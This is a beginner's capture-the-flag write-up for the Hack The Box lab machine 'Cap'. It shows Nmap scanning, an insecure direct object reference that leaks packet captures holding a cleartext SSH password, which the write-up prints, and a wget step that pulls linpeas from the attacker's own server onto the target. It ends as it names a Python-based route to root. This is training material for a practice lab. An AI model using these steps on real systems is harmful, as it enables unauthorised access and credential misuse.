# Cap

Hi:) this is my first write up and I decided to chose easy machine **Cap** from HTB.

## Enumeration

Just starting with Nmap:

```
nmap -sVC 10.10.10.245
```

![nmap](https://github.com/user-attachments/assets/428de170-61a9-4b2b-be77-85d76d020844)

Here we can see 3 tcp ports and on one of them there is FTP, in the future it may be useful. But now letâ€™s check the website. Add this to hosts file (or the site will not work):

```
10.10.10.245 cap.htb
```

## Checking HTTP (port 80)

![site1](https://github.com/user-attachments/assets/2632adb9-433d-40ae-a186-bbc7a642a361)

Wow, it's logged as user. Here we can see different pages: _**IP config**_ shows output of the `ifconfig` command, _**Network status**_ the output of the `netstat`, but the "Security snapshot" caught my attention.

When downloading, we get a **6.pcap** file, by opening it with **wireshark**, we can see the network data. If we try to re-visit this page, we will see a different value in the address bar, I have this value `7`. And if we try to change this value ourselves, there will be another file. Well, this is [IDOR](https://en.wikipedia.org/wiki/Insecure_direct_object_reference).

Deciding to check each **pcap** file, I tried the value `0`, and yes! This one is different from the others.

After analyzing it a little, I saw these lines:

Here we see requests in which the user _**Nathan**_ logs in and is successful, which means we can use this data.

### What we have at the moment? 
- Login: Nathan
- Password: Buck3tH4TF0RM3!


We've found out the most important thing, so now we can move on to logging in and searching for the flag.

Now we log in with this data, I will use SSH because it is more convenient, but you can also use FTP.

```
ssh nathan@10.10.10.245
```

And here is our user flag.

## Privilege Escalation

![image](https://github.com/user-attachments/assets/98284242-7e7e-4e65-9392-9d934aca2e50)

As we can see, our **Nathan** does not have the ability to use `sudo`, so we use `linpeas`.

Launching our server on Python:

```
sudo python3 -m http.server 9999
```
and with `wget` getting `linpeas`:

```
wget http://10.10.14.139:9999/linpeas.sh
```

![image](https://github.com/user-attachments/assets/4ec087bf-b0e1-48c1-a4e7-091e7055277c)

Launching linpeas:

```
nathan@10.10.10.245:~$ ./linpeas.sh
```
![image](https://github.com/user-attachments/assets/8367a5e4-c23a-4b19-9ccd-709f2034566d)

And that's the vulnerability, which means that with Python's help we can change Nathan's ID to Root's ID.
